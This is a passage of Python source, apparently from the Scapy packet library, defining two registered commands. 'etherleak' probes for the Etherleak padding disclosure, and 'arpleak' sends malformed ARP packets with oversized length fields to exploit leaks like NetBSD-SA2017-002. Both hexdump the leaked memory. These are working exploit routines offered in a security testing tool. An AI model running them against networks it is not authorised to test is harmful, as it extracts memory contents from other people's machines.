            self.send_function(reply, **self.optsend)
        else:
            self.send_function(reply, iface=self.iff, **self.optsend)

    def print_reply(self, req, reply):
        # type: (Packet, Packet) -> None
        print("%s ==> %s on %s" % (req.summary(), reply.summary(), self.iff))


@conf.commands.register
def etherleak(target, **kargs):
    # type: (str, **Any) -> Tuple[SndRcvList, PacketList]
    """Exploit Etherleak flaw"""
    return srp(Ether() / ARP(pdst=target),
               prn=lambda s_r: conf.padding_layer in s_r[1] and hexstr(s_r[1][conf.padding_layer].load),  # noqa: E501
               filter="arp", **kargs)


@conf.commands.register
def arpleak(target, plen=255, hwlen=255, **kargs):
    # type: (str, int, int, **Any) -> Tuple[SndRcvList, PacketList]
    """Exploit ARP leak flaws, like NetBSD-SA2017-002.

https://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2017-002.txt.asc

    """
    # We want explicit packets
    pkts_iface = {}  # type: Dict[str, List[Ether]]
    for pkt in ARP(pdst=target):
        # We have to do some of Scapy's work since we mess with
        # important values
        iface = conf.route.route(pkt.pdst)[0]
        psrc = get_if_addr(iface)
        hwsrc = get_if_hwaddr(iface)
        pkt.plen = plen
        pkt.hwlen = hwlen
        if plen == 4:
            pkt.psrc = psrc
        else:
            pkt.psrc = inet_aton(psrc)[:plen]
            pkt.pdst = inet_aton(pkt.pdst)[:plen]
        if hwlen == 6:
            pkt.hwsrc = hwsrc
        else:
            pkt.hwsrc = mac2str(hwsrc)[:hwlen]
        pkts_iface.setdefault(iface, []).append(
            Ether(src=hwsrc, dst=ETHER_BROADCAST) / pkt
        )
    ans, unans = SndRcvList(), PacketList(name="Unanswered")
    for iface, pkts in viewitems(pkts_iface):
        ans_new, unans_new = srp(pkts, iface=iface, filter="arp", **kargs)
        ans += ans_new
        unans += unans_new
        ans.listname = "Results"
        unans.listname = "Unanswered"
    for _, rcv in ans:
        if ARP not in rcv:
            continue
        rcv = rcv[ARP]
        psrc = rcv.get_field('psrc').i2m(rcv, rcv.psrc)
        if plen > 4 and len(psrc) > 4:
            print("psrc")
            hexdump(psrc[4:])
            print()
        hwsrc = rcv.get_field('hwsrc').i2m(rcv, rcv.hwsrc)
        if hwlen > 6 and len(hwsrc) > 6:
            print("hwsrc")
            hexdump(hwsrc[6:])
            print()
    return ans, unans
